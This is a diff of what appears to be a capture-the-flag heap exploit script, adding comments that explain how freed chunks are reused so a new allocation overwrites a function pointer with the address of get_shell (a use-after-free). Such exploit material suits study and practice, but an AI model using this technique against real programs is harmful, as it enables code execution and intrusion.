@@ -50,8 +50,8 @@ def show(idx):
 
 
 
-create(0x30, "a") #0
-create(0x30, "a") #1
+create(0x30, "a") #allocate animal_0 and name_0
+create(0x30, "a") #allocate animal_1 and name_1
 
 
  
@@ -60,8 +60,10 @@ create(0x30, "a") #1
 delete(0)
 delete(1)
 # debug()
-## buf_3 == animal_0
-create(0x18, p64(get_shell)) #2
+
+## animal_2 == animal_1
+## name_2 == animal_0
+create(0x18, p64(get_shell)) #allocate animal_2 and name_2
 
 # debug("b *0x4018bf")
 ## get_shell()
